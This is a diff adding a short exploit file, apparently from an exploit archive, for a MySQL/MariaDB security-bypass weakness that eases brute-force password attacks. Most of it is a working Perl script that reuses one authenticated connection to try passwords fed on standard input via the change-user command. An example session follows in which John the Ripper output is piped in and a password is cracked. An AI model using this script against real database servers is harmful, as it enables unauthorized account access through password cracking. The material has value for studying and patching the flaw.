@@ -1,0 +1,51 @@
+source: http://www.securityfocus.com/bid/56837/info
+
+MySQL and MariaDB are prone to a security-bypass weakness.
+
+An attacker may be able to exploit this issue to aid in brute-force attacks; other attacks may also be possible. 
+
+use Net::MySQL;
+
+$|=1;
+
+my $mysql = Net::MySQL->new(
+ hostname => '192.168.2.3',
+ database => 'test',
+ user     => "user",
+ password => "secret",
+ debug => 0,
+);
+
+$crackuser = "crackme";
+
+while(<stdin>) {
+chomp;
+$currentpass = $_;
+
+$vv = join "\0",
+                $crackuser,
+                "\x14".
+                Net::MySQL::Password->scramble(
+                        $currentpass, $mysql->{salt}, $mysql->{client_capabilities}
+                ) . "\0";
+if ($mysql->_execute_command("\x11", $vv) ne undef) {
+        print "[*] Cracked! --> $currentpass\n";
+        exit;
+}
+}
+---
+example session:
+
+C:\Users\kingcope\Desktop>C:\Users\kingcope\Desktop\john179\run\jo
+hn --incremental --stdout=5 | perl mysqlcrack.pl
+Warning: MaxLen = 8 is too large for the current hash type, reduced to 5
+words: 16382  time: 0:00:00:02  w/s: 6262  current: citcH
+words: 24573  time: 0:00:00:04  w/s: 4916  current: rap
+words: 40956  time: 0:00:00:07  w/s: 5498  current: matc3
+words: 49147  time: 0:00:00:09  w/s: 5030  current: 4429
+words: 65530  time: 0:00:00:12  w/s: 5354  current: ch141
+words: 73721  time: 0:00:00:14  w/s: 5021  current: v3n
+words: 90104  time: 0:00:00:17  w/s: 5277  current: pun2
+[*] Cracked! --> pass
+words: 98295  time: 0:00:00:18  w/s: 5434  current: 43gs
+Session aborted
